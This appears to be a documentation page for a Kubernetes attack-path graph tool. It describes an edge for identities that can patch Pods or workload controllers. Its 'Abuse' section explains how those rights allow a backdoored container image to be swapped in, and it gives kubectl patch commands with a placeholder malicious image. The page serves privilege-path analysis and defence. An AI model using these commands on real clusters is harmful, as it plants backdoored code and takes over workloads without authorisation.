# CH_canPatch

## Edge Schema

- **Source:** [CH_Identity](../NodeDescriptions/CH_Identity.md)
- **Target:** [CH_Pod](../NodeDescriptions/CH_Pod.md) / [CH_Workload](../NodeDescriptions/CH_Workload.md) / [CH_Namespace](../NodeDescriptions/CH_Namespace.md) / [CH_Cluster](../NodeDescriptions/CH_Cluster.md)

## General Information

The Identity holds `patch` or `update` permissions on Pods or pod-creating workload controllers (Deployment, StatefulSet, DaemonSet, ReplicaSet, ReplicationController, Job, CronJob). Points to specific Pod or Workload nodes if `resourceNames` is set, otherwise to the Namespace or Cluster. The edge carries a `resource` property (e.g. `Pod`, `Deployment`, `Pod,StatefulSet`) identifying which resource types are in scope, consistent with `CH_canCreate`.

## Edge Properties

| Property | Description |
|----------|-------------|
| resource | Comma-separated list of resource types the identity can patch (e.g. `Pod`, `Deployment`, `Pod,StatefulSet`). Multiple permitted types on the same target are merged into a single edge. |

## Abuse

For Pod targets: Kubernetes restricts which fields can be patched on running pods; most spec fields are immutable once the pod is scheduled. Image replacement is the most reliable path, swapping the container image for a backdoored version and causing it to restart.

For Workload targets: the impact depends on the controller type. Deployments, StatefulSets, and DaemonSets have built-in rolling update strategies, so patching the pod template automatically replaces existing pods with the modified spec. ReplicaSets and ReplicationControllers have no rolling update logic; the new template only applies to pods created after the patch, meaning existing pods must be manually deleted to force recreation. Jobs have already created their pods by the time you patch, so the template change has no effect on running pods. CronJobs will use the patched template for future scheduled runs only.

```bash
# Replace a container's image with a backdoored version
kubectl patch pod <pod> -n <namespace> \
  -p '{"spec":{"containers":[{"name":"<container>","image":"<malicious-image>"}]}}'

# Modify environment variables (triggers restart)
kubectl patch pod <pod> -n <namespace> \
  --type=json \
  -p '[{"op":"replace","path":"/spec/containers/0/env/0/value","value":"<new-value>"}]'
```

## References

- [kubectl patch](https://kubernetes.io/docs/reference/kubectl/generated/kubectl_patch/)
- [HackTricks - Patch Pods](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes#patch-pods)
- [OWASP K02 - Overly Permissive Authorization Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K02-Overly-Permissive-Authorization-Configurations.html)
- [Threat Matrix - Sidecar Injection](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Sidecar%20injection/)
